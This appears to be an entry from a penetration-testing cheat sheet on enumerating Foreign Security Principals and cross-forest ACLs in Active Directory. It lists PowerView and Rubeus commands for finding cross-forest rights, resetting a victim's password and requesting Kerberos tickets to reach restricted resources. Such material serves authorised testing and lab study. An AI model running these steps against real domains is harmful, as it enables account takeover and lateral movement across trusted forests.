# 14.07 Foreign Security Principals ACLs Cross-Forest

> Enumerate cross-forest Foreign Security Principals and ACLs — a GenericAll across the trust grants password reset + domain access.

## Overview

In cross-forest trusts, users from Forest A can be members of Domain Local groups in Forest B (Foreign Security Principals). Enumerate FSPs and cross-forest foreign group membership. Also enumerate cross-forest ACLs: a user in <DOMAIN>.ad may hold GenericAll over a user in logistics.ad, allowing password reset and domain access.

## Steps

- **Get-DomainObject -LDAPFilter '(objectclass=ForeignSecurityPrincipal)'** — find FSPs in target domain
- **ConvertFrom-SID** — resolve FSP SID to username
- **Get-DomainForeignGroupMember -Domain logistics.ad** — find <DOMAIN> users in logistics groups
- Enumerate cross-forest ACLs: **Get-DomainObjectAcl -ResolveGUIDs -Identity \* -domain logistics.ad** filtered by SID
- Abuse GenericAll on a user: **Set-DomainUserPassword** then **Rubeus asktgt**
- Abuse foreign group membership: **Rubeus createnetonly** + **asktgt** for the user, then access restricted resources
